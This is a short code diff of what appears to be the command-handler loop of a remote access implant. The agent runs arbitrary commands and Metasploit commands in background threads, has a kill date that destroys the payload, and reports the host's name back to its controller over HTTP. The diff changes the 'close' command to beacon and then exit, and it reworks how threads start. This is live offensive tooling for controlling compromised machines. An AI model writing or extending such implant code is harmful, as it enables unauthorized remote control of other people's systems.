@@ -116,11 +116,12 @@ def cmd_handler(cmd):
     try:
         # Exits by changing kill data to destroy payload
         if cmd == "close":
+            http_request("{} Closed.".format(HOSTNAME))
             KILL_DATE = datetime(int(2000), int(1), int(1))
-            return
+            exit(0)
 
         # Change kill date: change_date year,month,day
-        elif "change_date" in cmd: #@ ToDO QA  THIS
+        elif "change_date" in cmd:
             try:
                 kd = cmd.split(" ")
                 t = kd[1].split(",")
@@ -150,8 +151,12 @@ def cmd_handler(cmd):
                 resp="Metasploit Command Executed Successfully"
             else:
                 tmp = CmdExec()
-                Thread(target=tmp.cmd_exec, args=(cmd,), daemon=True).start()
-                Thread(target=cmd_timout, args=(tmp,), daemon=True).start()
+                t1 = Thread(target=tmp.cmd_exec, args=(cmd,))
+                t1.daemon=True
+                t1.start()
+                t2 = Thread(target=cmd_timout, args=(tmp,))
+                t2.daemon = True
+                t2.start()
                 while tmp.running:
                     sleep(.001)
                 resp = tmp.cmd
